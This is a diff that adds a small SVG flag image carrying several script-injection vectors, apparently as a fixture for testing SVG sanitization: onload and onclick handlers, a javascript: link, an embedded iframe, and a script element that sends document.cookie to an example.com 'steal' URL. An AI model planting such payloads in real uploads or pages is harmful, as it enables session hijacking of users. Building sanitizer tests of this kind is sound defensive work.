@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="900" height="600" onload="alert('onload')">
+  <script type="text/javascript">alert('script ran');fetch('https://example.com/steal?c='+document.cookie)</script>
+  <rect width="900" height="200" fill="#000"/><rect y="200" width="900" height="200" fill="#dd0000"/><rect y="400" width="900" height="200" fill="#ffce00"/>
+  <foreignObject width="900" height="600"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://example.com/"></iframe></body></foreignObject>
+  <a href="javascript:alert('link')"><circle cx="450" cy="300" r="80" fill="#fff" onclick="alert('click')"/></a>
+</svg>
